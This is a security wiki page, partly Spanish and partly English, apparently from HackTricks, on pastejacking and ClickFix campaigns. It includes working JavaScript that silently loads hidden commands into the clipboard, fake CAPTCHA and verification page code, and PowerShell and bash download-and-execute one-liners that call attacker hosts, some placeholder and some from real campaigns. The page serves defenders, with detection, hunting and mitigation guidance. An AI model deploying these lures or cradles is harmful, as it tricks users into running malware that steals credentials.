# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – consejo antiguo pero todavía válido

## Descripción general

Clipboard hijacking – también conocido como *pastejacking* – se aprovecha del hecho de que los usuarios rutinariamente copian y pegan comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con capacidad JavaScript como una aplicación Electron o Desktop) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. A las víctimas se les anima, normalmente mediante instrucciones de ingeniería social cuidadosamente elaboradas, a pulsar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Porque **no se descarga ningún archivo ni se abre ningún adjunto**, la técnica evade la mayoría de los controles de seguridad de correo electrónico y contenido web que monitorizan adjuntos, macros o la ejecución directa de comandos. El ataque es por tanto popular en campañas de phishing que entregan familias de malware comerciales como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Botones de copia forzada y payloads ocultos (comandos de una línea en macOS)

Algunos infostealers de macOS clonan sitios de instaladores (p. ej., Homebrew) y **obligan al uso de un botón “Copy”** para que los usuarios no puedan resaltar solo el texto visible. La entrada del portapapeles contiene el comando de instalación esperado más un payload en Base64 añadido (p. ej., `...; echo <b64> | base64 -d | sh`), por lo que un único pegado ejecuta ambos mientras la interfaz oculta la etapa extra.

## Prueba de concepto en JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas más antiguas usaban `document.execCommand('copy')`, las más recientes se basan en la asíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## El flujo ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript **ClearFake** inyectado llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente un one-liner de PowerShell codificado en Base64 en el portapapeles.
3. Las instrucciones HTML indican a la víctima: *“Presione **Win + R**, pegue el comando y presione Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más una DLL maliciosa (clásico DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. scheduled task) – y finalmente ejecuta NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) vía **curl.exe**, los descifra usando una clave XOR rodante `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el JScript downloader dentro de **cscript.exe**
3. Obtiene un MSI payload → deja `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** inicia un script oculto de PowerShell que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos, y finalmente ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un one‑liner que obtiene y ejecuta JavaScript vía WSH, lo persiste y rota el C2 diariamente. Ejemplo de cadena observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evitar la inspección casual.
- JavaScript se mantiene persistente a través de un Startup LNK (WScript/CScript), y selecciona el C2 según el día actual — permitiendo una rápida rotación de dominios.

Fragmento JS mínimo usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), con frecuencia fijando TLS a un certificado hardcoded y fragmentando el tráfico.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Caza de amenazas
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campañas recientes producen en masa páginas de verificación falsas en CDN/browser ("Just a moment…", IUAM-style) que obligan a los usuarios a copiar comandos específicos del OS desde su clipboard hacia consolas nativas. Esto pivota la ejecución fuera del sandbox del navegador y funciona tanto en Windows como en macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence de la ejecución inicial
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de que se cierre el terminal, reduciendo artefactos visibles.

In-place page takeover en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Páginas que enlazan Clipboard API con widgets de verificación; discrepancia entre el texto mostrado y la carga del portapapeles; `navigator.userAgent` branching; Tailwind + single-page replace en contextos sospechosos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción del navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- macOS endpoint: Terminal/iTerm que lanza `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; background jobs que sobreviven al cierre del terminal.
- Correlacionar el historial `RunMRU` de Win+R y las escrituras en el portapapeles con la creación posterior de procesos de consola.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake sigue comprometiendo sitios WordPress e inyectando loader JavaScript que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas de “etherhiding” en blockchain (p. ej., POSTs a endpoints de Binance Smart Chain API como `bsc-testnet.drpc[.]org`) para obtener la lógica actual del señuelo. Los overlays recientes usan intensamente fake CAPTCHAs que instruyen a los usuarios a copy/pastear un one-liner (T1204.004) en lugar de descargar nada.
- La ejecución inicial se delega cada vez más a signed script hosts/LOLBAS. Las cadenas de enero de 2026 reemplazaron el uso previo de `mshta` por el built-in `SyncAppvPublishingServer.vbs` ejecutado vía `WScript.exe`, pasando argumentos tipo PowerShell con aliases/wildcards para fetch contenido remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` está firmado y normalmente es usado por App-V; emparejado con `WScript.exe` y argumentos inusuales (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) se convierte en una etapa LOLBAS de alta señal para ClearFake.
- En febrero de 2026, los payloads falsos de CAPTCHA volvieron a cunas de descarga puras basadas en PowerShell. Dos ejemplos en vivo:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Detection/hunting tips for these variants
- Linaje de procesos: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles inmediatamente después de clipboard writes/Win+R.
- Palabras clave en la línea de comandos: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Red: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- Archivo/registro: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigaciones

1. Endurecimiento del navegador – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Concienciación en seguridad – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear arbitrary one-liners.
4. Controles de red – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
